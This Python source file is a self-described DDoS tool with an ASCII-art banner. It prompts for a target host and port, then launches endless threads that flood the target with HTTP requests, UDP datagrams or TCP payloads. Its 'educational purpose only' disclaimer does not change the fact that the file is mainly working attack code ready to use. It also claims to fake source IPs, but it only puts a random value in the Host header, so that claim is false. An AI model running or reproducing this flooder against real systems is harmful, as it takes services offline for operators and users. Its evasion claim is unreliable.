import threading
import socket
import random
import time
import os

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
RESET = '\033[0m'

os.system('cls' if os.name == 'nt' else 'clear')

print("\n-------------------------------------------------------------------------------------------------------------------------------")
print("■■             ■■  ■■■■■■■  ■■         ■■■■■■    ■■■■■        ■■■   ■■■      ■■■■■■■")
print(" ■■           ■■   ■■       ■■        ■■       ■■     ■■     ■■ ■■ ■■ ■■     ■■     ")
print("  ■■   ■■■   ■■    ■■■■■■■  ■■       ■■        ■■     ■■    ■■   ■■■   ■■    ■■■■■■■")
print("   ■■ ■■ ■■ ■■     ■■       ■■        ■■       ■■     ■■   ■■           ■■   ■■     ")
print("    ■■■   ■■■      ■■■■■■■  ■■■■■■■    ■■■■■■    ■■■■■    ■■             ■■  ■■■■■■■")
print("")
print("■■■■■■■■    ■■■■■")
print("   ■■     ■■     ■■")
print("   ■■     ■■     ■■")
print("   ■■     ■■     ■■")
print("   ■■       ■■■■■")
print("")
print("■■■■■■     ■■■■■■■  ■■■■■■■  ■■■■■■  ")
print("■■   ■■    ■■       ■■       ■■   ■■")
print("■■    ■■   ■■■■■■■  ■■■■■■■  ■■■■■■  ")
print("■■   ■■    ■■       ■■       ■■      ")
print("■■■■■■     ■■■■■■■  ■■■■■■■  ■■      ")
print("                                   ■■■■■   ■■■■■■■      ■■■■      ■■■■■■      ■■■■■■  ■■    ■■  ■■■■■■■  ■■■■■■")
print("                                  ■■       ■■          ■■  ■■     ■■   ■■    ■■       ■■    ■■  ■■       ■■   ■■")
print("                                   ■■■■■   ■■■■■■■    ■■■■■■■■    ■■■■■■    ■■        ■■■■■■■■  ■■■■■■■  ■■■■■■")
print("                                       ■■  ■■        ■■      ■■   ■■   ■■    ■■       ■■    ■■  ■■       ■■   ■■")
print("                                   ■■■■■   ■■■■■■■  ■■        ■■  ■■    ■■    ■■■■■■  ■■    ■■  ■■■■■■■  ■■    ■■")
print("")
print(RED + "■■■■■■    ■■■■■■      ■■■■■     ■■■■■")
print("■■   ■■   ■■   ■■   ■■     ■■  ■■")
print("■■    ■■  ■■    ■■  ■■     ■■   ■■■■■")
print("■■   ■■   ■■   ■■   ■■     ■■       ■■")
print("■■■■■■    ■■■■■■      ■■■■■     ■■■■■ " + RESET) 
print("\n-------------------------------------------------------------------------------------------------------------------------------")
print(GREEN + "Maker : Sigma")
print("Github : https://github.com/ermwhatesigma" + RESET)
print(RED+ "\n**note** This is a DDoS attacker script. Use for educational purpose only. \n **REMEMBER** It is illigal to attack an website if you don't have permisions for it" + RESET)
print(BLUE + "This script has a Random ip faker so it is harder for a server to stop attacks from an Slected IP. \n Everytime you rerun this script or the DDoS it generates an fake IP" + RESET)
print("")


def generate_random_ip():
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

def http_attack(target, port, fake_ip):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
            s.close()
        except socket.error as e:
            print(f"Error in HTTP attack: {e}")
            time.sleep(1)  # Wait for a second before retrying
        except Exception as e:
            print(f"Unexpected error in HTTP attack: {e}")
            time.sleep(1)  # Wait for a second before retrying

def udp_attack(target, port, fake_ip):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(random._urandom(1024), (target, port))
            s.close()
        except socket.error as e:
            print(f"Error in UDP attack: {e}")
            time.sleep(1)  # Wait for a second before retrying
        except Exception as e:
            print(f"Unexpected error in UDP attack: {e}")
            time.sleep(1)  # Wait for a second before retrying

def tcp_attack(target, port, fake_ip):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((target, port))
            s.send(random._urandom(1024))
            s.close()
        except socket.error as e:
            print(f"Error in TCP attack: {e}")
            time.sleep(1)  # Wait for a second before retrying
        except Exception as e:
            print(f"Unexpected error in TCP attack: {e}")
            time.sleep(1)  # Wait for a second before retrying

def main():
    target = input("Enter the target website or IP address (e.g., example.com or 192.168.1.1): ")
    port = int(input("Enter the target port (e.g., 80 for HTTP, 443 for HTTPS, 53 for DNS): "))
    attack_type = input("Enter the type of attack (HTTP, UDP, TCP): ").upper()

    if attack_type == "HTTP":
        attack_function = http_attack
    elif attack_type == "UDP":
        attack_function = udp_attack
    elif attack_type == "TCP":
        attack_function = tcp_attack
    else:
        print("Invalid attack type. Exiting...")
        return

    threads = []
    while True:
        fake_ip = generate_random_ip()
        thread = threading.Thread(target=attack_function, args=(target, port, fake_ip))
        threads.append(thread)
        thread.start()

        if len(threads) >= 500:
            for t in threads:
                t.join()
            threads = []

if __name__ == "__main__":
    main()


input("Press any key to clear the screen...")
os.system('cls' if os.name == 'nt' else 'clear')